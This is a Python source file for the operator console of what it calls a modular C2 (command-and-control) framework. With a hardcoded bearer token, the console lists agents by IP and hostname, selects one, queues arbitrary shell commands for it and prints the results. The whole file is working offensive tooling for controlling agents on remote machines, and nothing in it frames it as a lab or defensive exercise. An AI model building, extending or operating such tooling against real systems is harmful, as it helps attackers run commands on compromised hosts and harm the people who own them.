import cmd
import requests

SERVER_URL = "http://127.0.0.1:5000"
HEADERS = {"Authorization": "Bearer super_secret_c2_token_2026"}

class OperatorConsole(cmd.Cmd):
    intro = "\n=== Modular C2 Framework Operator Console ===\nType 'help' or '?' to list commands.\n"
    prompt = "C2-Operator> "
    current_agent = None

    def do_agents(self, arg):
        """List all registered agents."""
        try:
            res = requests.get(f"{SERVER_URL}/api/operator/agents", headers=HEADERS)
            agents = res.json()
            print(f"\n[+] Active Agents ({len(agents)}):")
            for a in agents:
                print(f"  ID: {a['agent_id']} | IP: {a['ip_address']} | Host: {a['hostname']} | Last Seen: {a['last_seen']}")
            print("")
        except Exception as e:
            print(f"[!] Error: {e}")

    def do_interact(self, arg):
        """Interact with a specific agent. Usage: interact <agent_id>"""
        if not arg:
            print("[!] Please provide an agent ID.")
            return
        self.current_agent = arg
        self.prompt = f"C2-Operator ({self.current_agent})> "
        print(f"[*] Interacting with {self.current_agent}")

    def do_shell(self, arg):
        """Queue a shell command for the currently interacting agent. Usage: shell <command>"""
        if not self.current_agent:
            print("[!] You must select an agent first using 'interact <agent_id>'")
            return
        try:
            requests.post(f"{SERVER_URL}/api/operator/task", json={"agent_id": self.current_agent, "command": arg}, headers=HEADERS)
            print(f"[*] Queued command '{arg}' for {self.current_agent}")
        except Exception as e:
            print(f"[!] Error: {e}")

    def do_results(self, arg):
        """Show the latest task results for the currently interacting agent."""
        if not self.current_agent:
            print("[!] You must select an agent first using 'interact <agent_id>'")
            return
        try:
            res = requests.get(f"{SERVER_URL}/api/operator/results/{self.current_agent}", headers=HEADERS)
            tasks = res.json()
            for t in tasks:
                print(f"\n--- Task ID {t['task_id']} | Command: {t['command']} | Status: {t['status']} ---")
                if t['output']: print(t['output'].strip())
            print("")
        except Exception as e:
            print(f"[!] Error: {e}")

    def do_exit(self, arg):
        """Exit the console."""
        print("Goodbye.")
        return True

if __name__ == '__main__':
    OperatorConsole().cmdloop()